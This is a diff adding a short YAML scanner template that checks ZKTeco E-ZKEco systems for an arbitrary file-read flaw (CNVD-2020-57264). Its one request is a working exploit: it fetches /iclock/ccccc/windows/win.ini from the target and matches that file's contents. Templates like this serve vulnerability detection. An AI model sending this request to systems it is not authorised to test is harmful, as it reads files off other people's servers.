@@ -1,0 +1,18 @@
+id: e-zkeco-cnvd-2020-57264-read-file
+
+info:
+    name: e-zkeco-cnvd-2020-57264-read-file
+    author: ThestaRY (https://github.com/ThestaRY7/)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /iclock/ccccc/windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: r0()
+
